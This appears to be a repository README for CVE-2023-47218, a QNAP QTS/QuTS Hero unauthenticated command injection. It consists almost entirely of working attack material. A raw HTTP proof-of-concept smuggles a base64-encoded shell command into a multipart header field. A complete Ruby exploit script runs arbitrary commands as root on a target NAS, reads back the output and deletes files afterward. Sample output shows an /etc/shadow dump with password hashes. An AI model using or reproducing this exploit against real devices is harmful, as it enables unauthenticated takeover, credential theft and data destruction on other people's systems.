# CVE-2023-47218
CVE-2023-47218: QNAP QTS and QuTS Hero Unauthenticated Command Injection (FIXED)

# POC

```
POST /cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image HTTP/1.1
Host: 192.168.86.42:8080
User-Agent: Mozilla Macintosh
Accept: */*
Content-Length: 164
Content-Type: multipart/form-data;boundary="avssqwfz"

--avssqwfz
Content-Disposition: form-data; xxpcscma="field2"; zczqildp="%22$($(echo -n aWQ=|base64 -d)>a)%22"
Content-Type: text/plain

skfqduny
--avssqwfz–
```

# EXP

```
require 'optparse'
require 'base64'
require 'socket' 

def log(txt)
  $stdout.puts txt
end

def rand_string(len)
  (0...len).map {'a'.ord + rand(26)}.pack('C*')
end

def send_http_data(ip, port, data)
  s = TCPSocket.open(ip, port)
  
  s.write(data)
  
  result = ''
  
  while line = s.gets
    result << line
  end
  
  s.close

  return result
end

def hax_single_command(ip, port, cmd, read_output=true, output_file_name='a')

  payload = "\"$($(echo -n #{Base64.strict_encode64(cmd)}|base64 -d)"

  if read_output
    payload << ">#{output_file_name}"
  end

  payload << ")\""

  payload.gsub!("\"", '%22')
  payload.gsub!(";", '%3B')

  if payload.length > 127
    log "[-] Error, the command is too long (#{payload.length}), must be < 128 bytes."
    return false
  end
  
  boundary = rand_string(8)
  
  txt  = "--#{boundary}\r\n"
  txt << "Content-Disposition: form-data; #{rand_string(8)}=\"field2\"; #{rand_string(8)}=\"#{payload}\"\r\n"
  txt << "Content-Type: text/plain\r\n"
  txt << "\r\n"
  txt << "#{rand_string(8)}\r\n"
  txt << "--#{boundary}--\r\n"

  body  = "POST /cgi-bin/quick/quick.cgi?func=switch_os&todo=uploaf_firmware_image HTTP/1.1\r\n"
  body << "Host: #{ip}:#{port}\r\n"
  body << "User-Agent: Mozilla Macintosh\r\n"
  body << "Accept: */*\r\n"
  body << "Content-Length: #{txt.bytesize}\r\n"
  body << "Content-Type: multipart/form-data;boundary=\"#{boundary}\"\r\n"
  body << "\r\n"
  body << txt

  result = send_http_data(ip, port, body)
  
  if result&.match? /HTTP\/1\.\d 200 OK/
    log "[+] Success, executed command: #{cmd}"
  else
    log "[-] Failed to execute command: #{cmd}"
    log result
    
    return false
  end
  
  if read_output

    result = send_http_data(ip, port, "GET /cgi-bin/quick/#{output_file_name} HTTP/1.1\r\nHost: #{ip}:#{port}\r\nAccept: */*\r\n\r\n")
    
    if result&.match? /HTTP\/1\.\d 200 OK/

      found_content = false
      
      result.lines.each do |line|
        if line == "\r\n"
          found_content = true
          next
        end
        
        log line if found_content 
      end    
    else
      log "[-] Failed to read back output."
      log result
      
      return false
    end
  end

  return true
end

def hax(options)

  log "[+] Targeting: #{options[:ip]}:#{options[:port]}"

  output_file_name = 'a'

  return unless hax_single_command(options[:ip], options[:port], options[:cmd], true, output_file_name)
  
  return unless hax_single_command(options[:ip], options[:port], "rm -f #{output_file_name}", false, output_file_name)
  
  return unless hax_single_command(options[:ip], options[:port], 'rm -f /mnt/HDA_ROOT/update/*', false, output_file_name)
end

options = {}

OptionParser.new do |opts|
  opts.banner = "Usage: hax1.rb [options]"

  opts.on("-t", "--target TARGET", "Target IP") do |v|
    options[:ip] = v
  end
  
  opts.on("-p", "--port PORT", "Target Port") do |v|
    options[:port] = v.to_i
  end  
  
  opts.on("-c", "--cmd COMMAND", "Command to execute") do |v|
    options[:cmd] = v
  end
end.parse!

unless options.key? :ip
  log '[-] Error, you must pass a target IP: -t TARGET'
  return
end

unless options.key? :port
  log '[-] Error, you must pass a target port: -p PORT'
  return
end

unless options.key? :cmd
  log '[-] Error, you must pass a command to execute: -c COMMAND'
  return
end

log "[+] Starting..."

hax(options)

log "[+] Finished."
```

```
>ruby qnap_hax.rb -t 192.168.86.42 -p 8080 -c id
[+] Starting...
[+] Targeting: 192.168.86.42:8080
[+] Success, executed command: id
uid=0(admin) gid=0(administrators) groups=0(administrators),100(everyone)
[+] Success, executed command: rm -f a
[+] Success, executed command: rm -f /mnt/HDA_ROOT/update/*
[+] Finished.

>ruby qnap_hax.rb -t 192.168.86.42 -p 8080 -c "cat /etc/shadow"
[+] Starting...
[+] Targeting: 192.168.86.42:8080
[+] Success, executed command: cat /etc/shadow
admin:$1$$CoERg7ynjYLdj2j4glJ34.:14233:0:99999:7:::
guest:$1$$ysap7EeB9ODCtO46Psdbq/:14233:0:99999:7:::
[+] Success, executed command: rm -f a
[+] Success, executed command: rm -f /mnt/HDA_ROOT/update/*
[+] Finished.
```

# Reference

- https://www.rapid7.com/blog/post/2024/02/13/cve-2023-47218-qnap-qts-and-quts-hero-unauthenticated-command-injection-fixed/
